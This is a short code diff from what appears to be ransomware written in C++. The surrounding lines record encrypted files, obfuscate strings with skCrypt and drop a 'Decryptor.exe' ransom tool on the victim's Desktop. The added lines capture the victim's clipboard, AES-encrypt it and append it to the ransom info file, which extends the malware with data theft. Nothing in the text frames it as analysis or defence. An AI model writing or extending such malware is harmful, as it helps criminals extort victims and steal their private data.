@@ -100,6 +100,9 @@ int main(int argc, char* argv[])
     infoFileContent += cryptedFiles_txt;
     infoFileContent += skCrypt("\n");
 
+    infoFileContent += aes_encrypt(KEY, getClipboard(), IV);
+    infoFileContent += skCrypt("\n");
+
 
     if (DROP_README)
         dropFile(InfoDecryptorContent, (string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\Desktop\\Decryptor.exe"));
